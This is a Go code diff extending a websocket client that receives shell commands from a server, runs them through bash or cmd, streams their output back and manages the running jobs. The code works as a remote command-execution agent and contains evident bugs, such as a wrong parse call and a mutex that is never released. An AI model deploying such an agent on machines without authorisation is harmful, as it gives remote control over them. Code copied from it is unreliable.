@@ -17,22 +17,31 @@ import (
 	"os/user"
 	"runtime"
 	"strings"
+	"sync"
+	"time"
 
 	"github.com/coder/websocket"
 )
 
+var mut sync.Mutex
+
+var id               int
+var Commands         map[int]Execution
+var CommandsStatuses map[int]int
+var CommandsLogs     map[int]string
+var commandsMsgs     map[int][]string
+var PingError        error
+var ReceiveError     error
+
 type Execution struct {
+	cmd    *exec.Cmd
 	stdin  io.WriteCloser
 	stdout io.ReadCloser
 	stderr io.ReadCloser
 }
 
-// var id           int
-var Commands     map[int]Execution
-var PingError    error
-var ReceiveError error
-
 type Message struct {
+	Method   string `json:"Method"`
     Sender   int    `json:"sender"`
     Receiver int    `json:"receiver"`
     Message  []byte `json:"message"`
@@ -47,8 +56,9 @@ func NewMessageFromJSON(bytes []byte) (Message, error) {
     return msg, nil
 }
 
-func NewMessageToJSON(sender, receiver int, message []byte, end bool) ([]byte, error) {
+func NewMessageToJSON(method string, sender, receiver int, message []byte, end bool) ([]byte, error) {
     msg := Message{
+		Method:   method,
         Sender:   sender,
         Receiver: receiver,
         Message:  message,
@@ -98,7 +108,7 @@ func (client *Client) Start(websocket_URL string) {
 	bytes, err := json.Marshal(client)
 	if err != nil { log.Panic(err) }
 
-	err = client.Write(client.Id, -1, bytes, true)
+	err = client.Write("#!handshake", client.Id, -1, bytes, true)
 	if err != nil { log.Panic(err) }
 
 	msg, err := client.Read()
@@ -122,33 +132,30 @@ func (client *Client) Ping() {
 			PingError = err
 			return
 		}
+		
+		time.Sleep(300 * time.Millisecond)
 	}
 }
 
-func Execute(command, os string) (*exec.Cmd, Execution, error) {
+func Execute(command, os string) (Execution, error) {
 	var cmd *exec.Cmd
 	if os == "windows" {
 		cmd = exec.Command("cmd", "/c", command)
 	} else {
 		cmd = exec.Command("bash", "-c", command)
 	}
-	
+
 	stdin,  err := cmd.StdinPipe()
-	if err != nil { return cmd, Execution{}, err }
+	if err != nil { return Execution{cmd, nil, nil, nil}, err }
 
 	stdout, err := cmd.StdoutPipe()
-	if err != nil { return cmd, Execution{}, err }
+	if err != nil { return Execution{cmd, nil, nil, nil}, err }
 
 	stderr, err := cmd.StderrPipe()
-	if err != nil { return cmd, Execution{}, err }
+	if err != nil { return Execution{cmd, nil, nil, nil}, err }
 
-	if err := cmd.Start(); err != nil { return cmd, Execution{}, err }
-
-	return cmd, Execution{stdin, stdout, stderr}, nil
-
-	// if err := cmd.Wait(); err != nil {
-	// 	return stdout, err
-	// }
+	if err := cmd.Start(); err != nil { return Execution{cmd, nil, nil, nil}, err }
+	return Execution{cmd, stdin, stdout, stderr}, nil
 }
 
 func (client *Client) Receive() {
@@ -157,46 +164,130 @@ func (client *Client) Receive() {
 
 		msg, err := client.Read()
 		if PingError != nil { return }
-		if err != nil { log.Print(err, 12) }
+		if err != nil { log.Panic(err) }
 
-		log.Print(msg, string(msg.Message))
+		msgparts := strings.Split(string(msg.Message), " ")
+		if msg.Method == "#!execute" {
+			ExecutionFunction(client, msg)
+		} else if msg.Method == "#!execution" && msgparts[0] == "list" {
+			bytes, err := json.Marshal(CommandsStatuses)
+			if err != nil { log.Panic(err) }
 
-		cmd, execution, err := Execute(string(msg.Message), client.OS)
-		if err != nil { client.Write(client.Id, msg.Sender, []byte(err.Error()), true) }
-		
-		scanner := bufio.NewScanner(execution.stdout)
-		for scanner.Scan() {
-			err := client.Write(client.Id, msg.Sender, append([]byte("#!execution "), scanner.Bytes()...), false)
-			if err != nil { log.Print(err, 123)}
+			client.Write("#!execution", client.Id, msg.Sender, bytes, true)
+		} else if msg.Method == "#!execution" && msgparts[0] == "id" && msgparts[2] == "ok" {
+			var cmdid int
+			if n, _ := fmt.Sscan(msgparts[1], &cmdid); n == 0 { log.Panic(err) }
 
-			msg, err := client.Read()
-			if err != nil { log.Print(err, 321) }
+			mut.Lock()
+			commandsMsgs[cmdid] = append(commandsMsgs[cmdid], msgparts[2])
+			mut.Unlock()
+		} else if msg.Method == "#!execution" && msgparts[0] == "id" && msgparts[2] == "stop" {
+			var cmdid int
+			if n, _ := fmt.Scan(msgparts[2], &cmdid); n == 0 { log.Panic(err) }
 
-			if string(msg.Message) != "ok" { cmd.Cancel(); break }
+			mut.Lock()
+			execution := Commands[cmdid]
+			execution.cmd.Cancel()
+			mut.Unlock()
+
+			err := client.Write("#!execution", client.Id, msg.Sender, []byte(fmt.Sprintf("id %d interrupted", cmdid)), true)
+			if err != nil { log.Panic(err) }
+		} else if msg.Method == "#!execution" && msgparts[0] == "id" && msgparts[2] == "log" {
+			var cmdid int
+			if n, _ := fmt.Scan(msgparts[2], &cmdid); n == 0 { log.Panic(err) }
+
+			mut.Lock()
+			commandLog := CommandsLogs[cmdid]
+			mut.Unlock()
+
+			err := client.Write("#!execution", client.Id, msg.Sender, []byte(fmt.Sprintf("id %d log %v", cmdid, commandLog)), true)
+			if err != nil { log.Panic(err) }
+		} else if msg.Method == "#!execution" && msgparts[0] == "id" && msgparts[2] == "delete" {
+			var cmdid int
+			if n, _ := fmt.Scan(msgparts[2], &cmdid); n == 0 { log.Panic(err) }
+
+			mut.Lock()
+			commandStatus := CommandsStatuses[cmdid]
+			mut.Unlock()
+
+			if commandStatus == 0 {
+				mut.Lock()
+				execution := Commands[cmdid]
+				execution.cmd.Cancel()
+				mut.Unlock()
+			}
+
+			err := client.Write("#!execution", client.Id, msg.Sender, []byte(fmt.Sprintf("id %d deleted", cmdid)), true)
+			if err != nil { log.Panic(err) }
+		} else {
+			fmt.Println(msg.Method, string(msg.Message), msg.End)
 		}
-		err = client.Write(client.Id, msg.Sender, []byte("#!execution end"), true)
-		if err != nil { log.Print(err, 123)}
-
-		defer cmd.Wait()
 	}
+}
+
+func ExecutionFunction(client *Client, msg Message) {
+	cmdid := id; id++
+	cmdparts := strings.Split(string(msg.Message), " ")
+	err := client.Write("#!execution", client.Id, msg.Sender, []byte(fmt.Sprint("id ", cmdid, " start ", cmdparts[1])), true)
+	if err != nil { log.Panic(err)}
+
+	execution, err := Execute(strings.Join(cmdparts[2:], " "), client.OS)
+	if err != nil { client.Write("#!execution", client.Id, msg.Sender, []byte(err.Error()), true) }
+
+	go func(){
+		mut.Lock()
+		commandsMsgs[cmdid]     = []string{}
+		CommandsLogs[cmdid]     = ""
+		CommandsStatuses[cmdid] = 0
+		mut.Unlock()
+
+		scanner := bufio.NewScanner(execution.stdout)
+		var c int
+		for scanner.Scan() {
+			fmt.Println(c)
+			c++
+			bytes := scanner.Bytes()
+			err := client.Write("#!execution", client.Id, msg.Sender, append([]byte(fmt.Sprintf("id %d ", cmdid)), bytes...), false)
+			file, _ := os.OpenFile("out", os.O_CREATE|os.O_APPEND, 0777)
+			file.Write(bytes)
+			file.Close()
+			if err != nil { log.Panic(err)}
+			
+			msg := ""
+			for {
+				mut.Lock()
+				msgs := commandsMsgs[cmdid]
+				if len(msgs) > 0 { msg = msgs[0]; commandsMsgs[cmdid] = commandsMsgs[cmdid][1:]; break }
+				mut.Unlock()
+			}
+
+			if msg != "ok" {
+				log.Panic(msg)
+			}
+		}
+
+		defer execution.cmd.Wait()
+	}()
 }
 
 func (client *Client) Read() (Message, error) {
 	_, bytes, err := client.Conn.Read(context.Background())
-    if err != nil { log.Print(err, 3); return Message{}, err }
+    if err != nil { log.Panic(err, 3); return Message{}, err }
     
     msg, err := NewMessageFromJSON(bytes)
-    if err != nil { log.Print(err, 14); return Message{}, err }
+    if err != nil { log.Panic(err, 14); return Message{}, err }
 
+	fmt.Println("Read: ", msg.Method, string(msg.Message), msg.End)
     return msg, nil
 }
 
-func(client *Client) Write(sender, receiver int, bytes []byte, end bool) error {
-	msg_bytes, err := NewMessageToJSON(sender, receiver, bytes, end)
-    if err != nil { log.Print(err, 4); return err }
+func(client *Client) Write(method string, sender, receiver int, bytes []byte, end bool) error {
+	fmt.Println("Write: ", method, string(bytes), end)
+	msg_bytes, err := NewMessageToJSON(method, sender, receiver, bytes, end)
+    if err != nil { log.Panic(err, 4); return err }
 
     err = client.Conn.Write(context.Background(), websocket.MessageText, msg_bytes)
-    if err != nil { log.Print(err, 10); return err }
+    if err != nil { log.Panic(err, 10); return err }
 
 	return nil
 }
@@ -263,6 +354,10 @@ func getPublicIP() (string, error) {
 }
 
 func main() {
+	CommandsStatuses = map[int]int{}
+    CommandsLogs     = map[int]string{}
+    commandsMsgs     = map[int][]string{}
+
 	secretKey, err := getSecretKey(256)
 	if err != nil { log.Fatal(err) }
 
